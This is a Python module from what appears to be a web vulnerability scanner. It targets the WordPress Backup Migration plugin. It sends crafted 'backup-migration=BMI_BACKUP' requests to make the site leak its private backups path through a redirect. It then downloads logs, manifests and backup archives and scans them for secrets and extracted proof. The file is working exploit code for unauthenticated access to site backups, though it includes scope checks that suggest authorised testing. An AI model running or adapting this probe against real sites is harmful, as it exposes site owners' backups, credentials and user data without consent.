from __future__ import annotations

from urllib.parse import quote, urljoin, urlsplit

from ravage.web_core.http_probe import ProbeResponse, ProbeSession, response_secrets
from ravage.probes.cms.cms_exposure_archives import _inspect_archive
from ravage.probes.cms.cms_exposure_shared import (
    _BACKUP_MIGRATION_ARCHIVE_RE,
    _dedupe,
    _header_value,
    _interesting_artifact,
    _record_proof,
    _rewrite_url,
)


def _is_backup_migration_signal(response: ProbeResponse, url: str) -> bool:
    lowered_url = url.lower()
    lowered_body = response.body[:5000].lower()
    if response.status not in {200, 201, 202, 206, 301, 302, 303, 307, 308}:
        return False
    markers = ("backup-migration", "backup-backup", "backupbliss")
    for marker in markers:
        if marker in lowered_url or marker in lowered_body:
            return True
    return False


def _backup_migration_unlock_flow(
    session: ProbeSession,
    *,
    headers: dict[str, str],
) -> tuple[list[dict[str, object]], list[dict[str, object]]]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    unlock_url = session.absolute("/?backup-migration=BMI_BACKUP&backup-id=probe.zip")
    response = session.get(unlock_url, headers=headers or None)
    requests.append(
        response.summary(body_chars=220)
        | {"probe_kind": "cms_backup_migration_unlock", "url": unlock_url, "headers_used": headers}
    )
    if response.status not in {301, 302, 303, 307, 308}:
        return findings, requests
    location = _header_value(response, "Location")
    if not location:
        return findings, requests
    leaked_url = _rewrite_url(session, location, headers=headers)
    if (
        not leaked_url
        or not session.in_scope(leaked_url)
        or "/backups/" not in urlsplit(leaked_url).path
    ):
        return findings, requests

    root_url = leaked_url.rsplit("/backups/", 1)[0] + "/"
    archive_names: list[str] = []
    inspected_archives: set[str] = set()
    for artifact_url in _backup_migration_artifact_urls(root_url):
        artifact_response = session.get(artifact_url, headers=headers or None)
        requests.append(
            artifact_response.summary(body_chars=420)
            | {
                "probe_kind": "cms_backup_migration_artifact",
                "url": artifact_url,
                "headers_used": headers,
            }
        )
        if _record_proof(artifact_response, findings, url=artifact_url):
            return findings, requests
        if _interesting_artifact(artifact_response):
            findings.append(
                {
                    "type": "cms_backup_artifact",
                    "url": artifact_url,
                    "status": artifact_response.status,
                    "matches": response_secrets(artifact_response),
                    "detail": "Backup Migration private artifact became readable after direct-download redirect",
                }
            )
        for archive_name in _backup_migration_archive_names(artifact_response.body):
            if archive_name in inspected_archives:
                continue
            inspected_archives.add(archive_name)
            archive_names.append(archive_name)
            archive_finding, archive_requests = _inspect_backup_migration_archive(
                session,
                headers=headers,
                archive_name=archive_name,
            )
            requests.extend(archive_requests)
            if archive_finding:
                findings.append(archive_finding)
                if archive_finding.get("type") == "cms_exposure_extracted_proof":
                    return findings, requests

    for archive_name in _dedupe(archive_names)[:4]:
        if archive_name in inspected_archives:
            continue
        archive_finding, archive_requests = _inspect_backup_migration_archive(
            session,
            headers=headers,
            archive_name=archive_name,
        )
        requests.extend(archive_requests)
        if archive_finding:
            findings.append(archive_finding)
            if archive_finding.get("type") == "cms_exposure_extracted_proof":
                return findings, requests

    return findings, requests


def _inspect_backup_migration_archive(
    session: ProbeSession,
    *,
    headers: dict[str, str],
    archive_name: str,
) -> tuple[dict[str, object] | None, list[dict[str, object]]]:
    requests: list[dict[str, object]] = []
    redirect_url = session.absolute(
        "/?backup-migration=BMI_BACKUP&backup-id=" + quote(archive_name, safe="")
    )
    redirect_response = session.get(redirect_url, headers=headers or None)
    requests.append(
        redirect_response.summary(body_chars=220)
        | {
            "probe_kind": "cms_backup_migration_archive_redirect",
            "url": redirect_url,
            "headers_used": headers,
            "archive_name": archive_name,
        }
    )
    if redirect_response.status not in {301, 302, 303, 307, 308}:
        return None, requests
    archive_location = _header_value(redirect_response, "Location")
    if not archive_location:
        return None, requests
    archive_url = _rewrite_url(session, archive_location, headers=headers)
    if not archive_url or not session.in_scope(archive_url):
        return None, requests
    archive_finding = _inspect_archive(session, archive_url, headers=headers)
    requests.append(
        {
            "probe_kind": "cms_backup_migration_archive_inspect",
            "url": archive_url,
            "headers_used": headers,
            "archive_name": archive_name,
            "finding": archive_finding or {},
        }
    )
    return archive_finding, requests


def _backup_migration_artifact_urls(root_url: str) -> list[str]:
    return [
        urljoin(root_url, "complete_logs.log"),
        urljoin(root_url, "backups/latest.log"),
        urljoin(root_url, "backups/latest_migration.log"),
        urljoin(root_url, "backups/latest_progress.log"),
        urljoin(root_url, "backups/latest_migration_progress.log"),
        urljoin(root_url, "backups/md5summary.php"),
        urljoin(root_url, "backups/backup_manifest.json"),
    ]


def _backup_migration_archive_names(body: str) -> list[str]:
    names: list[str] = []
    for match in _BACKUP_MIGRATION_ARCHIVE_RE.finditer(body or ""):
        names.append(match.group(1).strip("'\""))

    filtered: list[str] = []
    for name in _dedupe(names):
        if "*" in name:
            continue
        if name.lower() == "index.php":
            continue
        filtered.append(name)
    return filtered
